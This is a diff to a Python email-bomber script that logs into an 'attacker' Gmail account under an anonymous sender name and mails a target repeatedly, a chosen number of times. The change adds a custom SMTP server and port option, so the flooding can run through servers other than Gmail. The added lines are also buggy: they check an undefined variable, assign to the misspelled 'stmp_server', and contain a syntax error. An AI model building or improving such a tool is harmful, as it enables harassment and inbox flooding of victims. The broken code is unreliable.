@@ -5,11 +5,11 @@
 # Python 3 rewrite by Omicron166
 
 
-import os
+from os import urandom
 import smtplib
-import getpass
+from getpass import getpass
 import sys
-import time
+from time import sleep
 
 print ('                                                                    ')
 print ('                                                                    ')
@@ -35,7 +35,7 @@ email = input('Attacker Gmail Address : ')
 print ('             ')
 user = input('Anonymous name : ')
 print ('      ')
-passwd = getpass.getpass('Password: ')
+passwd = getpass('Password: ')
 
 print ('   ')
 
@@ -50,8 +50,20 @@ print ('    ')
 
 total = input('Number of send: ')
 
-smtp_server = 'smtp.gmail.com'
-port = 587
+print ('    ')
+
+Cserver = input('Custom smtp server (leave blank to use gmail): ')
+
+if not server == '':
+    stmp_server = Cserver
+    Cport = input('Custom smtp port (leave blank to use port 587): '))
+    if not Cport == '':
+        port = int(Cport)
+    else:
+        port = 587
+else:
+    smtp_server = 'smtp.gmail.com'
+    port = 587
 
 
 print ('')
@@ -62,11 +74,11 @@ try:
     server.starttls()
     server.login(email, passwd)
     for i in range(1, int(total) + 1):
-        subject = os.urandom(9)
+        subject = urandom(9)
         msg = 'From: ' + user + '\nSubject: ' + '\n' + body
         server.sendmail(email, to, msg)
         print ("\rE-mails sent: %i" % i)
-        time.sleep(1)
+        sleep(1)
         sys.stdout.flush()
     server.quit()
     print ('\n Done !!!')
@@ -74,5 +86,5 @@ except KeyboardInterrupt:
     print ('[-] Canceled')
     sys.exit()
 except smtplib.SMTPAuthenticationError:
-    print ('\n[!] The username or password you entered is incorrect.')
+    print ('\n[!] The username, password or custom STMP server you entered is incorrect.')
     sys.exit()
